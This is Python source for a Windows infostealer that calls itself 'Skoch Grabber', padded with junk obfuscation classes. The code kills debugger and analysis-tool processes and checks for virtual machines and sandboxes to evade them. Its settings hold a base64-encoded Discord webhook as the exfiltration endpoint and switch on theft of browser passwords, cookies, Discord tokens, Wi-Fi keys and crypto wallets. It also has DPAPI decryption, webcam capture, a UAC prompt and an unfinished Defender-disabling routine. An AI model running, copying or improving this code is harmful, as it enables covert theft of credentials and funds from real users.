
class vLUJGDydBz:
    def __init__(self):
        self.__ymAkPHsW()
        self.__DxmhvFsCecUUjMVgz()
        self.__aILkcNwLZjdf()
        self.__LZoZUTKc()
        self.__FuqydhPrnJNmrg()
        self.__jfRpzMqiVL()
        self.__uBoYWWmwNuWwifYOHut()
        self.__keVEKwOfkJqUvJfWmuU()
        self.__pLoItmKzyXV()
        self.__YJHThKftQIjJEttdMkS()
        self.__CWxPtpoSRzt()
        self.__GCcwExQFdKFpKQ()
        self.__hKILneLcaDRKujYr()
        self.__kVMiMjMlnNDrSH()
        self.__ENARhQuyYScDVoXKuP()
    def __ymAkPHsW(self, jgKASBuKjIxD, WKZpcSDpM, hqpYAfTcGoelQSrS, licTYBhQgxTXNAWTErkd, ZzjYeFSctUcKhiq):
        return self.__kVMiMjMlnNDrSH()
    def __DxmhvFsCecUUjMVgz(self, GTOXfuPpxtMDatXHssA, SilSDwgGufiIJ, PUzMtoAwhHF, IDxTOWS, kFOihovNk, BIIQAjVoZjY, YCvnndjufkqr):
        return self.__GCcwExQFdKFpKQ()
    def __aILkcNwLZjdf(self, Rotbu, POALTuA):
        return self.__LZoZUTKc()
    def __LZoZUTKc(self, BtWSJxATY, awUYMKUpHFaC, GGApxu):
        return self.__YJHThKftQIjJEttdMkS()
    def __FuqydhPrnJNmrg(self, lNCVdXPULe):
        return self.__LZoZUTKc()
    def __jfRpzMqiVL(self, KiwqHEXS, MgZIMtQGZPvx, RTMCRjzIjoRY, VXvPXQAWGxKpDgfSL, yhLdkUKC):
        return self.__aILkcNwLZjdf()
    def __uBoYWWmwNuWwifYOHut(self, bzQFbJjGMDntMgXJmqfX, uzSJp):
        return self.__uBoYWWmwNuWwifYOHut()
    def __keVEKwOfkJqUvJfWmuU(self, YtkQL, dlbHTzCmcF, dxbODDVuatTtIr):
        return self.__LZoZUTKc()
    def __pLoItmKzyXV(self, drpznfIGspdW, QJxpkpZ, nCuECZfeUO):
        return self.__hKILneLcaDRKujYr()
    def __YJHThKftQIjJEttdMkS(self, xzwFQjEvtK, qjujhsFNksuNRgNQK, oMqKRBKkxUmWNuZN, uImkuxBOIwfIGbtTt):
        return self.__ymAkPHsW()
    def __CWxPtpoSRzt(self, qdYdEIzUEWuO, BEgJdCZqmjMkaZ, qkVJdA, DqszGCXmWHpmQo, WqPPWebHHBHfNDKH, AQzpvPRJOVGNtdXDOA):
        return self.__jfRpzMqiVL()
    def __GCcwExQFdKFpKQ(self, CjNNdcSNa, WVDSXf, rLqyYnFntgih, cSJCovKs, KgkJHoMJrLNnyFJvJ):
        return self.__FuqydhPrnJNmrg()
    def __hKILneLcaDRKujYr(self, MefYAlFauRQTjux, eRaERueWV):
        return self.__GCcwExQFdKFpKQ()
    def __kVMiMjMlnNDrSH(self, zBxRNrswyGDD, CVFMxn, RYwWqv, huSvuFKipT, mThuQpHrIQTlHtdgGqh, WqIoGVSEEcFXbft, LTqqeVWNmIIwh):
        return self.__CWxPtpoSRzt()
    def __ENARhQuyYScDVoXKuP(self, bfGLH, LfbVChtOiwDxikqB, MgDyNaw, GYHBWKykEeMMXzP, RxeBBs, rPDQJpRd):
        return self.__ENARhQuyYScDVoXKuP()
class EeBTRIvNH:
    def __init__(self):
        self.__sdCHaeeiMVSAMledjngU()
        self.__heePjJPteetEDlLf()
        self.__yiiEaeGPMfMSIdmCiHF()
        self.__sZBZmmykIlw()
        self.__GSeKhsFpGXUzYZJV()
        self.__gNGqWiDCGcCWNNG()
        self.__ZPOAuCkUWYBDu()
        self.__xWTLKkQedBFZRVEq()
        self.__bMHZOyEvozoVzFBYszcO()
        self.__UAEZPHyDdVvzesCIeD()
        self.__EMoCYTjCC()
    def __sdCHaeeiMVSAMledjngU(self, lCOCjbuVJAPorxH):
        return self.__sdCHaeeiMVSAMledjngU()
    def __heePjJPteetEDlLf(self, MrmtkjySGXIQydicBfi, enYktaKfBZnJzcmsAI, FkyQwEj, DlZtOEnAfZXtbuuDmv, PxKtXxHeAuwXx):
        return self.__sZBZmmykIlw()
    def __yiiEaeGPMfMSIdmCiHF(self, GiMEQluotRAbATZbp, OXiaouwETiy):
        return self.__ZPOAuCkUWYBDu()
    def __sZBZmmykIlw(self, bzCrqIsuvQGJd, kvwgLOrlZSU, VmLsTJlSsPatrhKMqi):
        return self.__EMoCYTjCC()
    def __GSeKhsFpGXUzYZJV(self, aTtdprBALwYx, uToJN):
        return self.__heePjJPteetEDlLf()
    def __gNGqWiDCGcCWNNG(self, fkmQwgUJICQlVSMl, DRFccvdQnFE, cdexOiTz):
        return self.__bMHZOyEvozoVzFBYszcO()
    def __ZPOAuCkUWYBDu(self, mRCwkT, FatGcGWFZnDdyo, avgKDAHoMTmIjlO, taPVsgJkw, jKxteZ):
        return self.__xWTLKkQedBFZRVEq()
    def __xWTLKkQedBFZRVEq(self, NPoLxWxuTfPUyoQOYtp):
        return self.__sZBZmmykIlw()
    def __bMHZOyEvozoVzFBYszcO(self, HRfSEHsHGRzupxIT):
        return self.__sZBZmmykIlw()
    def __UAEZPHyDdVvzesCIeD(self, ODVQxWnZuuIGAayK, tTFcPxSEHe, EFvGce, OyyyWSxObhuCZWDGDB, AKHgplgrpjuCxlzkR, cxycsIUrUPqlXPVPm):
        return self.__UAEZPHyDdVvzesCIeD()
    def __EMoCYTjCC(self, ppGViCxILyB, cfDCL, DkfmKSVgKYpr, SinavqAwdEl, qsnvISWxuPZ):
        return self.__heePjJPteetEDlLf()
class QBeDZMxB:
    def __init__(self):
        self.__mgbzjfQS()
        self.__jnVvohffSttZGZCwXdW()
        self.__zuoWyVXMfmcBMa()
        self.__bHxLvySAFDrB()
        self.__IvFDHmcpYnWWzGxT()
        self.__UEbimFjlhtJFWiPZ()
    def __mgbzjfQS(self, mrAjFClA, cGPyjqPFxEMuWGHsy, hLnqggPdBSrrM, NeDUXmYDlOKI, ZIUKnFhWNtHKaXP, osHaLEb):
        return self.__zuoWyVXMfmcBMa()
    def __jnVvohffSttZGZCwXdW(self, fzQcJpbtPJ, QGCVeiJCTFbDk, dZKehaHGHdonDhPiZ, ozkDXffIBOU, RSBRTKRqYuaRMUOFhwd):
        return self.__bHxLvySAFDrB()
    def __zuoWyVXMfmcBMa(self, qYsRkeEApXbrefbYHBi, FFezCgmLZJKhGVXk, blVwM):
        return self.__IvFDHmcpYnWWzGxT()
    def __bHxLvySAFDrB(self, GvuNxOvCqsPz, fnErtMBqYiKcGd, nrnVqOr, iYEEiAqCPP, sOiLAg, oXmtLbHvNkEM, NdTKnnXcoQbnLEye):
        return self.__UEbimFjlhtJFWiPZ()
    def __IvFDHmcpYnWWzGxT(self, zwzMekJPWssJYdZSBFo, XIbVHtVqENPKe, NXPwPBxHyUsBzUXGHgqt):
        return self.__zuoWyVXMfmcBMa()
    def __UEbimFjlhtJFWiPZ(self, OMRejuSOWxhDndUNs, LSMTu):
        return self.__IvFDHmcpYnWWzGxT()
import ctypes, sys
if not ctypes.windll.shell32.IsUserAnAdmin() != 0:
    print("Please run this program as administrator.")
    sys.exit(0)
import binascii, threading, time
try:
    from psutil import process_iter
except:
    import os
    os.system("pip install psutil")
d = [
    '53757370656e64', '50726f67726573732054656c6572696b20466964646c657220576562204465627567676572', '466964646c6572', '57697265736861726b',
    '64756d70636170', '646e537079', '646e5370792d783836', '6368656174656e67696e652d7838365f3634', '4854545044656275676765725549',
    '50726f636d6f6e', '50726f636d6f6e3634', '50726f636d6f6e363461', '50726f636573734861636b6572',
    '783332646267', '783634646267', '446f744e657444617461436f6c6c6563746f723332',
    '446f744e657444617461436f6c6c6563746f723634', '485454504465627567676572537663', '48545450204465627567676572', '696461', '6964613634', '69646167', '696461673634',
    '69646177', '696461773634', '69646171', '696461713634', '69646175', '696461753634',
    '7363796c6c61', '7363796c6c615f783634', '7363796c6c615f783836', '70726f74656374696f6e5f6964',
    '77696e646267', '7265736861636b6572', '496d706f7274524543', '494d4d554e4954594445425547474552',
    '4d65676144756d706572', '646973617373656d626c79', '4465627567', '5b435055496d6d756e697479',
    '4d65676144756d70657220312e3020627920436f6465437261636b6572202f20536e44', '436861726c6573', '636861726c6573', '4f4c4c59444247', '496d706f72745f7265636f6e7374727563746f72',
    '636f6465637261636b6572', '646534646f74', '696c737079', '67726179776f6c66',
    '73696d706c65617373656d626c796578706c6f726572', '7836346e657464756d706572', '687864',
    '7065746f6f6c73', '73696d706c65617373656d626c79', '68747470616e616c797a6572', '687474706465627567', '70726f636573736861636b6572', '6d656d6f727965646974', '6d656d6f7279',
    '646534646f746d6f64646564', '70726f63657373206861636b6572', '70726f63657373206d6f6e69746f72',
    '717435636f7265', '696461', '696d6d756e697479', '68747470', '74726166666963',
    '77697265736861726b', '666964646c6572', '7061636b6574', '6861636b6572', '6465627567', '646e737079', '646f747065656b', '646f747472616365', '70726f6364756d70', '6d616e61676572',
    '6d656d6f7279', '6e65744c696d6974', '6e65744c696d69746572', '73616e64626f78'
]
d = [binascii.unhexlify(i.encode()).decode() for i in d]
def debugger():
    while True:
        try:
            for proc in process_iter():
                for i in d:
                    if i.lower() in proc.name().lower():
                        proc.kill()
        except Exception:
            pass
        time.sleep(0.5)
threading.Thread(target=debugger, daemon=True).start()


class yUzBpSqVPrZCTLeCDr:
    def __init__(self):
        self.__ZoywTCzxbfgAGRNRVJV()
        self.__ApfPCnuOasWxkLZ()
        self.__XZotxYFqnNOCpxZCKf()
        self.__YSXVvZpouAY()
        self.__FjSMPzUKrStILzWr()
        self.__fvMUWFcovMrFoWUQc()
        self.__MOujMBdInCxPJBJF()
    def __ZoywTCzxbfgAGRNRVJV(self, ZxBvlTtZcumIRsUkUx):
        return self.__FjSMPzUKrStILzWr()
    def __ApfPCnuOasWxkLZ(self, IZkCwWHRrRGZfT, LhJipZggsJ, FcfigIZwa, eQTzzEdvdHJ, GOVUCAcpRsnupevkBKPW, qiaMOWWaHjVUo, dhSjfCURdI):
        return self.__YSXVvZpouAY()
    def __XZotxYFqnNOCpxZCKf(self, ZgQRdvNDwyWXuP, ZSGMedEnAjDK, zDXgjEECaoJMij, NdLkTyOXdeIhWSq, edYosGDLBtGRUkhrwuK):
        return self.__fvMUWFcovMrFoWUQc()
    def __YSXVvZpouAY(self, ikRRoCNLwgApnEaGad, OWRHpl):
        return self.__ApfPCnuOasWxkLZ()
    def __FjSMPzUKrStILzWr(self, DdEhkjZkpbdaGbwZeSN, sWamf, SFDuYMpUgvwYpHswBN, fKtmCFDeWLsPkzAhRAFl, bVSFSN, pZMXd):
        return self.__ApfPCnuOasWxkLZ()
    def __fvMUWFcovMrFoWUQc(self, diUxu, mCxGHWJRMRLcmEufP, hhlXwkcqu, yNiUeUMnedyXLZVLYLqp, JYWwD, GZWGRMvEIzqsVZnsfcH, WVWtiij):
        return self.__ZoywTCzxbfgAGRNRVJV()
    def __MOujMBdInCxPJBJF(self, lxUXStscAbthggvs, mpLTn, hZMDnHquafyAfaGPDNM, IjQxRZhnlwVPc, bGhegAafUCyeOxvqU, FjOTvHrEve):
        return self.__MOujMBdInCxPJBJF()
class guvuqQNqANUw:
    def __init__(self):
        self.__QZrvNCkKJpM()
        self.__gJrpvkhLbkmEKbWs()
        self.__QZDelZWJnGUCC()
        self.__FElowPqVUXhQeDtgT()
        self.__kNKrbzInYtFIzVo()
        self.__KvqtcrwKgVKiurtVJQaN()
        self.__pYNDLvrxUC()
        self.__hLAvXUKWbdW()
        self.__FhRsCPbqRfyYQkSVVGvt()
        self.__lXOIbLBhMstjgsPHcL()
        self.__XARGubZMEmxUZ()
        self.__dOJRQZIDZJNQP()
    def __QZrvNCkKJpM(self, vAcGLtzqnIYEWTT):
        return self.__QZrvNCkKJpM()
    def __gJrpvkhLbkmEKbWs(self, iDlSitosiXpRhc):
        return self.__FhRsCPbqRfyYQkSVVGvt()
    def __QZDelZWJnGUCC(self, ynIxNxIjaJyvg, VewTBCdcc, FemaGDD, FTeyZWvEUGjvIZRo):
        return self.__hLAvXUKWbdW()
    def __FElowPqVUXhQeDtgT(self, eUIPzqLNHgI, gAqgXHTBDVcitsPFzkX, TkGrFOI, ltkTtjXilQCN, MvovVeEyIkSONoVMB):
        return self.__KvqtcrwKgVKiurtVJQaN()
    def __kNKrbzInYtFIzVo(self, mbIDKWBoMmctJQsyNNUy, EXQbiGFyqOKLzP, idfQlqyXvTrO, TJvHSwtlbVgI, SfpDJr):
        return self.__QZDelZWJnGUCC()
    def __KvqtcrwKgVKiurtVJQaN(self, nPoUShmBAxsi, bqJJqNzTFqKWHooE, zulLT, UJaDDZrtXjW, WnHSv, OvQEyKDe):
        return self.__pYNDLvrxUC()
    def __pYNDLvrxUC(self, BCagvANwvAzQuuvDS, JetHIBOwTsnSR, LvXrJNyAjyUfIqGMAZkV):
        return self.__dOJRQZIDZJNQP()
    def __hLAvXUKWbdW(self, sWrabMWZlLTt, CGCQqFOhl):
        return self.__gJrpvkhLbkmEKbWs()
    def __FhRsCPbqRfyYQkSVVGvt(self, tYcTttviZtvTFw, FyFgdUG, mrLmQUVcOuYfenzPrI, AuhPSrXkR):
        return self.__lXOIbLBhMstjgsPHcL()
    def __lXOIbLBhMstjgsPHcL(self, RkgwZyqPIzhtPVrmkn, UZTbSbGImmKJjUTmIbF, jOlQBaomZTGETAWXaQX):
        return self.__FhRsCPbqRfyYQkSVVGvt()
    def __XARGubZMEmxUZ(self, MyadZh, XxKBXoLArMaBP, ovnrqtieiZxI, msEjcCBTKmD, zPrzfy, YHILDuLyJEBNhlb):
        return self.__FhRsCPbqRfyYQkSVVGvt()
    def __dOJRQZIDZJNQP(self, MdljMpNkOWaOcc):
        return self.__dOJRQZIDZJNQP()
class bNzPEfwPFdyyhFABEFSy:
    def __init__(self):
        self.__comGxFKmyWiDn()
        self.__eHUqqSFXkMTxFMwNzX()
        self.__deptfJcDGWWXdDC()
        self.__ulfNBbLhgKUD()
        self.__dFUAPZHPG()
        self.__itngBevBTuJmgpkFPR()
        self.__VcLwAXZYUlkVpWxYQ()
        self.__ODkXkdOObeEkrpdAJiQl()
        self.__yyQYxCXCKcFyTNi()
        self.__dmMMbTnjLtU()
        self.__hAzxxWYk()
    def __comGxFKmyWiDn(self, SknkWuDSI):
        return self.__itngBevBTuJmgpkFPR()
    def __eHUqqSFXkMTxFMwNzX(self, OtIvI, NaenqMNgheTavOC, hrMZKKv, OuZtsux, GjKDrQbDspqQCyMh, kFzeoafB):
        return self.__VcLwAXZYUlkVpWxYQ()
    def __deptfJcDGWWXdDC(self, xBTnsxNfpgwLvk):
        return self.__comGxFKmyWiDn()
    def __ulfNBbLhgKUD(self, EjWXQKmMck):
        return self.__hAzxxWYk()
    def __dFUAPZHPG(self, HoiCLuzgfLRm):
        return self.__eHUqqSFXkMTxFMwNzX()
    def __itngBevBTuJmgpkFPR(self, PSJwWKKBBmMezkLSRvnn, XUfSYYEofpFZyVuBPWI):
        return self.__comGxFKmyWiDn()
    def __VcLwAXZYUlkVpWxYQ(self, gIKPGMLiY, QwClPokVyKZuJGMVePPK, hAlZWcrRFOG, FFzOqDduxVz):
        return self.__ODkXkdOObeEkrpdAJiQl()
    def __ODkXkdOObeEkrpdAJiQl(self, PTQzRZB, kBNRj):
        return self.__VcLwAXZYUlkVpWxYQ()
    def __yyQYxCXCKcFyTNi(self, iDfoOleqJzEfTBozdEKq, MfHyKqNRuuMSAMze, FUSVOBBriWMxFhDQcZi, LsBcitJkKGpA, paEllOnyRP):
        return self.__VcLwAXZYUlkVpWxYQ()
    def __dmMMbTnjLtU(self, CpGTb, pkWvTJTD, UYkRACoi, RjfZCqZSvVYGQZICo, yTOhz, hEzswSWcyIpTxxO):
        return self.__VcLwAXZYUlkVpWxYQ()
    def __hAzxxWYk(self, qVFBFxHGwHtngcDjkN):
        return self.__comGxFKmyWiDn()
class lhQgeAuZOqr:
    def __init__(self):
        self.__JXEDPjwyi()
        self.__zPDeNXQV()
        self.__CAbmunuS()
        self.__hAIyQbJSbiDdrdrzLbh()
        self.__RVnQnrniOMdMS()
        self.__WGHRMghLPm()
    def __JXEDPjwyi(self, dMKlEnQziFFOInMslLo):
        return self.__WGHRMghLPm()
    def __zPDeNXQV(self, gczDlLsXsfAcQQNY, pgKJnOnFYrdTwF):
        return self.__CAbmunuS()
    def __CAbmunuS(self, irTGGutnaUVAwaDm, zbmkjR, oYpgCYb, vMvmUavRjN, geyvjDZnmmMzdIPI, lvBAFVkoGQJPUm):
        return self.__hAIyQbJSbiDdrdrzLbh()
    def __hAIyQbJSbiDdrdrzLbh(self, TyGCZKjAwEeCENgA, ZpCCocLPmsd, rcfrEVrUT, IUQoTjGrumYLyYDgQmv, zAIsHNja):
        return self.__hAIyQbJSbiDdrdrzLbh()
    def __RVnQnrniOMdMS(self, UPDHUzz):
        return self.__zPDeNXQV()
    def __WGHRMghLPm(self, XUmBsTPhNwsX, WqeesXHKlz, PILgwjoV, WXAmbnghzfbpGnI, bGXZt, IUmEMryzk, MJcUhIy):
        return self.__hAIyQbJSbiDdrdrzLbh()
# pip install pyaesm urllib3

import base64
import os
import subprocess
import sys
import json
import pyaes
import random
import shutil
import sqlite3
import re
import traceback
import time
import ctypes
import logging
import zlib
from threading import Thread
from ctypes import wintypes
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()

class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE2NjQ1NTkwNDU0ODQyNTgxOC8zaU9YRjN3cEYwbkVjeU9oSi0xN0dVekpUZEhTT3FWbm94VDRpY3RBWnZ2TS1EcWJsVzNuNTZZSHM1dXlUbFhCQmcxeQ==').decode())
    Mutex = base64.b64decode('WmN0UHJXQ1dReDRZUDBLbQ==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('c2tvY2g=').decode()
    HideConsole = bool('true')
    Debug = bool('')
    RunBoundOnStartup = bool('')
    CaptureWebcam = bool('')
    CapturePasswords = bool('true')
    CaptureCookies = bool('true')
    CaptureAutofills = bool('true')
    CaptureHistory = bool('true')
    CaptureDiscordTokens = bool('true')
    CaptureGames = bool('true')
    CaptureWifiPasswords = bool('true')
    CaptureSystemInfo = bool('true')
    CaptureScreenshot = bool('')
    CaptureTelegram = bool('')
    CaptureCommonFiles = bool('')
    CaptureWallets = bool('true')
    FakeError = (bool(''), ('', '', '0'))
    BlockAvSites = bool('true')
    DiscordInjection = bool('')
if not hasattr(sys, '_MEIPASS'):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
for _, logger in logging.root.manager.loggerDict.items():
    logger.disabled = True
Logger = logging.getLogger('Skoch Grabber')
Logger.setLevel(logging.INFO)
if not Settings.Debug:
    Logger.disabled = True

class VmProtect:
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def checkUUID() -> bool:
        Logger.info('Checking UUID')
        uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
        return uuid in VmProtect.BLACKLISTED_UUIDS

    @staticmethod
    def checkComputerName() -> bool:
        Logger.info('Checking computer name')
        computername = os.getenv('computername')
        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool:
        Logger.info('Checking username')
        user = os.getlogin()
        return user.lower() in VmProtect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool:
        Logger.info('Checking if system is hosted online')
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors='ignore').strip() == 'true'
        except Exception:
            Logger.info('Unable to check if system is hosted online')
            return False

    @staticmethod
    def checkHTTPSimulation() -> bool:
        Logger.info('Checking if system is simulating connection')
        http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
        try:
            http.request('GET', f'https://skoch-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool:
        Logger.info('Checking registry')
        r1 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
        r2 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
        gpucheck = any((x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware')))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return r1.returncode != 1 and r2.returncode != 1 or gpucheck or dircheck

    @staticmethod
    def killTasks() -> None:
        Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)

    @staticmethod
    def isVM() -> bool:
        Logger.info('Checking if system is a VM')
        Thread(target=VmProtect.killTasks, daemon=True).start()
        result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
        if result:
            Logger.info('System is a VM')
        else:
            Logger.info('System is not a VM')
        return result

class Errors:
    errors: list[str] = []

    @staticmethod
    def Catch(func):

        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    Errors.errors.append(trb)
                    if Utility.GetSelf()[1]:
                        Logger.error(trb)
        return newFunc

class Tasks:
    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.threads.append(task)

    @staticmethod
    def WaitForAll() -> None:
        for thread in Tasks.threads:
            thread.join()

class Syscalls:

    @staticmethod
    def CaptureWebcam(index: int, filePath: str) -> bool:
        avicap32 = ctypes.windll.avicap32
        WS_CHILD = 1073741824
        WM_CAP_DRIVER_CONNECT = 1024 + 10
        WM_CAP_DRIVER_DISCONNECT = 1026
        WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('Skoch'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
                    result = True
                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            ctypes.windll.user32.DestroyWindow(hcam)
        return result

    @staticmethod
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183

    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str=None) -> bytes:

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None
        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode('utf-16')
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError('Invalid encrypted_data provided!')

    @staticmethod
    def HideConsole() -> None:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def TaskKill(*tasks: str) -> None:
        tasks = list(map(lambda x: x.lower(), tasks))
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split('\r\n')[:2]
            try:
                name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
                name = name[:-4] if name.endswith('.exe') else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except Exception:
                pass

    @staticmethod
    def UACPrompt(path: str) -> bool:
        return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42

    @staticmethod
    def DisableDefender() -> None:
